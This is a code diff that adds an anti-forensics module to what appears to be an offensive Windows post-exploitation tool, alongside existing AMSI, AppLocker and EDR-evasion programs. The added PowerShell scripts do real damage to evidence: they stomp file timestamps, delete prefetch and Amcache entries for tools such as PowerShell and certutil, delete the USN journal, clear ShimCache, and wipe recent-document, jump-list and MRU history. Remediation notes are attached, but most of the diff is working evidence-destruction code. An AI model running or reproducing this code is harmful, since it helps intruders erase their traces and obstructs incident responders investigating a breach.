@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  anti_forensics: {
+    description:
+      "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
+    args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
+  },
 } as const satisfies Record<string, { description: string; args: string }>
 
 type Program = keyof typeof PROGRAMS
@@ -13850,6 +13855,326 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function antiForensics(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "full"
+  const target = argVal(args, "--target")
+  const timestamp = argVal(args, "--timestamp")
+  const reference = argVal(args, "--reference")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Anti-forensics operations...\n"]
+
+  if (action === "stomp" || action === "full") {
+    const tsExpr = timestamp
+      ? `[DateTime]::Parse('${timestamp}')`
+      : reference
+        ? `(Get-Item '${reference}').LastWriteTime`
+        : `(Get-Date).AddDays(-30)`
+    const targetPath = target || "."
+    const script = `
+$targetTime = ${tsExpr}
+$files = @()
+if (Test-Path '${targetPath}' -PathType Container) {
+  $files = Get-ChildItem '${targetPath}' -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 50
+} else {
+  $files = @(Get-Item '${targetPath}' -ErrorAction SilentlyContinue)
+}
+
+Write-Output "=== Timestamp Stomping ==="
+Write-Output "Target time: $targetTime"
+Write-Output ""
+
+$stomped = 0
+foreach ($f in $files) {
+  try {
+    $origCreate = $f.CreationTime
+    $origModify = $f.LastWriteTime
+    $origAccess = $f.LastAccessTime
+    $f.CreationTime = $targetTime
+    $f.LastWriteTime = $targetTime
+    $f.LastAccessTime = $targetTime
+    Write-Output "[+] $($f.FullName)"
+    Write-Output "    Created:  $origCreate -> $targetTime"
+    Write-Output "    Modified: $origModify -> $targetTime"
+    Write-Output "    Accessed: $origAccess -> $targetTime"
+    $stomped++
+  } catch {
+    Write-Output "[-] Failed: $($f.FullName) — $($_.Exception.Message)"
+  }
+}
+Write-Output ""
+Write-Output "[*] Stomped $stomped files"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-ANTIFOR-001",
+      provider: "windows",
+      severity: "medium",
+      status: "EXECUTED",
+      resource: "filesystem://timestamps",
+      title: "File timestamps modified to evade timeline analysis",
+      details: r.stdout.substring(0, 500),
+      remediation: "Verify file timestamps against MFT $SI vs $FN attributes using forensic tools.",
+    })
+  }
+
+  if (action === "prefetch" || action === "full") {
+    const script = `
+Write-Output "=== Prefetch Cleanup ==="
+$prefetchPath = "$env:SystemRoot\\Prefetch"
+if (Test-Path $prefetchPath) {
+  $prefetchFiles = Get-ChildItem $prefetchPath -Filter "*.pf" -ErrorAction SilentlyContinue
+  $count = $prefetchFiles.Count
+  Write-Output "[*] Found $count prefetch files"
+
+  $suspicious = $prefetchFiles | Where-Object { $_.Name -match 'POWERSHELL|CMD|WMIC|MSHTA|CERTUTIL|REGSVR32|MSBUILD|RUNDLL32|CSCRIPT|WSCRIPT' }
+  Write-Output "[*] Suspicious prefetch entries: $($suspicious.Count)"
+  foreach ($pf in $suspicious) {
+    Write-Output "    [!] $($pf.Name) — LastRun: $($pf.LastWriteTime)"
+  }
+
+  foreach ($pf in $suspicious) {
+    try {
+      Remove-Item $pf.FullName -Force -ErrorAction Stop
+      Write-Output "[+] Removed: $($pf.Name)"
+    } catch {
+      Write-Output "[-] Failed to remove: $($pf.Name) — $($_.Exception.Message)"
+    }
+  }
+} else {
+  Write-Output "[-] Prefetch directory not found (may be disabled)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-ANTIFOR-002",
+      provider: "windows",
+      severity: "medium",
+      status: "EXECUTED",
+      resource: "filesystem://prefetch",
+      title: "Removed suspicious prefetch entries to hide execution evidence",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor Prefetch directory with integrity checks. Sysmon Event ID 23 tracks file deletes.",
+    })
+  }
+
+  if (action === "amcache" || action === "full") {
+    const script = `
+Write-Output "=== Amcache Cleanup ==="
+$amcachePath = "$env:SystemRoot\\appcompat\\Programs\\Amcache.hve"
+if (Test-Path $amcachePath) {
+  $acl = Get-Acl $amcachePath -ErrorAction SilentlyContinue
+  Write-Output "[*] Amcache.hve found: $amcachePath"
+  Write-Output "[*] Size: $((Get-Item $amcachePath).Length) bytes"
+  Write-Output "[*] Last modified: $((Get-Item $amcachePath).LastWriteTime)"
+  Write-Output ""
+  Write-Output "[*] Amcache is locked by the system — requires offline access or reg load"
+  Write-Output "[*] Attempting registry-based cleanup..."
+
+  try {
+    $tempKey = "HKLM\\TEMP_AMCACHE_$(Get-Random)"
+    $loadResult = reg load $tempKey $amcachePath 2>&1
+    if ($LASTEXITCODE -eq 0) {
+      $rootKey = Get-ChildItem "Registry::$tempKey\\Root" -ErrorAction SilentlyContinue
+      $inventoryApp = Get-ChildItem "Registry::$tempKey\\Root\\InventoryApplicationFile" -ErrorAction SilentlyContinue
+      Write-Output "[*] Amcache entries: $($inventoryApp.Count)"
+
+      foreach ($entry in $inventoryApp) {
+        $name = $entry.GetValue("Name")
+        $path = $entry.GetValue("LowerCaseLongPath")
+        if ($name -match 'powershell|cmd|wmic|mshta|certutil|regsvr32|msbuild|cscript') {
+          Write-Output "[!] Suspicious: $name — $path"
+          Remove-Item $entry.PSPath -Recurse -Force -ErrorAction SilentlyContinue
+          Write-Output "[+] Removed entry: $name"
+        }
+      }
+      reg unload $tempKey 2>&1 | Out-Null
+      Write-Output "[+] Amcache cleanup complete"
+    } else {
+      Write-Output "[-] Cannot load Amcache (in use): $loadResult"
+      Write-Output "[*] Alternative: copy Amcache.hve to temp, clean offline, restore"
+    }
+  } catch {
+    Write-Output "[-] Amcache cleanup failed: $($_.Exception.Message)"
+  }
+} else {
+  Write-Output "[-] Amcache.hve not found"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-ANTIFOR-003",
+      provider: "windows",
+      severity: "medium",
+      status: "EXECUTED",
+      resource: "registry://amcache",
+      title: "Attempted removal of execution evidence from Amcache registry hive",
+      details: r.stdout.substring(0, 500),
+      remediation: "Backup Amcache.hve regularly. Monitor registry hive load/unload with Sysmon Event ID 12/13.",
+    })
+  }
+
+  if (action === "usn" || action === "full") {
+    const script = `
+Write-Output "=== USN Journal Manipulation ==="
+$drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" | Select-Object -ExpandProperty DeviceID
+
+foreach ($drive in $drives) {
+  Write-Output "[*] Drive: $drive"
+
+  try {
+    $usnInfo = fsutil usn queryjournal $drive 2>&1
+    if ($LASTEXITCODE -eq 0) {
+      Write-Output $usnInfo
+      Write-Output ""
+
+      $deleteResult = fsutil usn deletejournal /d $drive 2>&1
+      if ($LASTEXITCODE -eq 0) {
+        Write-Output "[+] USN journal deleted on $drive"
+        $createResult = fsutil usn createjournal m=1000 a=100 $drive 2>&1
+        Write-Output "[+] Fresh USN journal created on $drive (minimal size)"
+      } else {
+        Write-Output "[-] Failed to delete USN journal: $deleteResult"
+      }
+    } else {
+      Write-Output "[-] No USN journal on $drive"
+    }
+  } catch {
+    Write-Output "[-] Error on $drive — $($_.Exception.Message)"
+  }
+  Write-Output ""
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-ANTIFOR-004",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: "filesystem://usn-journal",
+      title: "Deleted and recreated USN change journal to remove file operation history",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor fsutil.exe execution. Alert on USN journal deletion (requires kernel-level monitoring).",
+    })
+  }
+
+  if (action === "shimcache" || action === "full") {
+    const script = `
+Write-Output "=== ShimCache (AppCompatCache) Cleanup ==="
+$shimPath = "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache"
+
+try {
+  $shimData = Get-ItemProperty $shimPath -Name AppCompatCache -ErrorAction Stop
+  $dataSize = $shimData.AppCompatCache.Length
+  Write-Output "[*] AppCompatCache size: $dataSize bytes"
+
+  $backupPath = "$env:TEMP\\shimcache_backup_$(Get-Date -Format 'yyyyMMddHHmmss').bin"
+  [System.IO.File]::WriteAllBytes($backupPath, $shimData.AppCompatCache)
+  Write-Output "[*] Backup saved: $backupPath"
+
+  $header = $shimData.AppCompatCache[0..3]
+  $emptyCache = New-Object byte[] 4
+  [Array]::Copy($header, $emptyCache, 4)
+  Set-ItemProperty $shimPath -Name AppCompatCache -Value $emptyCache -Type Binary
+  Write-Output "[+] ShimCache cleared (header preserved, entries removed)"
+  Write-Output "[!] Changes take effect after reboot"
+} catch {
+  Write-Output "[-] ShimCache cleanup failed: $($_.Exception.Message)"
+  Write-Output "[*] May require SYSTEM privileges"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-ANTIFOR-005",
+      provider: "windows",
+      severity: "medium",
+      status: "EXECUTED",
+      resource: "registry://shimcache",
+      title: "Cleared AppCompatCache to remove program execution evidence",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor AppCompatCache registry key modifications with Sysmon Event ID 13.",
+    })
+  }
+
+  if (action === "recent" || action === "full") {
+    const script = `
+Write-Output "=== Recent Docs / Jump Lists Cleanup ==="
+
+$recentPath = "$env:APPDATA\\Microsoft\\Windows\\Recent"
+$jumpListAuto = "$env:APPDATA\\Microsoft\\Windows\\Recent\\AutomaticDestinations"
+$jumpListCustom = "$env:APPDATA\\Microsoft\\Windows\\Recent\\CustomDestinations"
+
+$recentCount = (Get-ChildItem $recentPath -File -ErrorAction SilentlyContinue).Count
+Write-Output "[*] Recent items: $recentCount"
+
+$autoCount = (Get-ChildItem $jumpListAuto -ErrorAction SilentlyContinue).Count
+Write-Output "[*] Automatic jump list entries: $autoCount"
+
+$customCount = (Get-ChildItem $jumpListCustom -ErrorAction SilentlyContinue).Count
+Write-Output "[*] Custom jump list entries: $customCount"
+
+Write-Output ""
+Write-Output "[*] Clearing recent documents..."
+Remove-Item "$recentPath\\*.lnk" -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Recent .lnk files cleared"
+
+Write-Output "[*] Clearing automatic jump lists..."
+Remove-Item "$jumpListAuto\\*" -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Automatic destinations cleared"
+
+Write-Output "[*] Clearing custom jump lists..."
+Remove-Item "$jumpListCustom\\*" -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Custom destinations cleared"
+
+$explorerDialogMRU = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU"
+if (Test-Path $explorerDialogMRU) {
+  Get-ChildItem $explorerDialogMRU | ForEach-Object { Remove-Item $_.PSPath -Recurse -Force -ErrorAction SilentlyContinue }
+  Write-Output "[+] Explorer Open/Save MRU cleared"
+}
+
+$typedPaths = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths"
+if (Test-Path $typedPaths) {
+  Remove-ItemProperty $typedPaths -Name "url*" -ErrorAction SilentlyContinue
+  Write-Output "[+] Explorer typed paths cleared"
+}
+
+$runMRU = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
+if (Test-Path $runMRU) {
+  Remove-ItemProperty $runMRU -Name "[a-z]" -ErrorAction SilentlyContinue
+  Remove-ItemProperty $runMRU -Name "MRUList" -ErrorAction SilentlyContinue
+  Write-Output "[+] Run dialog MRU cleared"
+}
+
+Write-Output ""
+Write-Output "[*] Cleanup complete — recent activity evidence removed"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-ANTIFOR-006",
+      provider: "windows",
+      severity: "low",
+      status: "EXECUTED",
+      resource: "filesystem://recent-docs",
+      title: "Cleared recent documents, jump lists, MRU lists, and Explorer history",
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor Recent folder and registry MRU keys for mass deletion events.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -17456,6 +17781,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  anti_forensics: antiForensics,
 }
 
 export const WinhookTool = Tool.define("winhook", {
